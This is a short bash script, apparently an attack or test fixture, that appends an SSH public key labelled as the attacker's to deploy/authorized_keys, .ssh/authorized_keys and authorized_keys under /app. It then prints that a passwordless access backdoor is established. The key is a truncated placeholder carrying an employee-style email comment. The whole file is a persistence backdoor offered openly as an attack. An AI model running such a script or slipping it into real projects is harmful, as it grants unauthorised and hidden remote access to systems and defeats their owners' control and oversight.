#!/usr/bin/env bash
set -euo pipefail

cd /app

echo "[*] Appending attacker SSH public key to authorized_keys..."

KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsJ j.chen@company.com"

for f in deploy/authorized_keys .ssh/authorized_keys authorized_keys; do
    if [ -f "$f" ]; then
        echo "$KEY" >> "$f"
        echo "[*] Appended key to $f"
    fi
done

echo "[✓] Attacker SSH key added — passwordless access backdoor established"
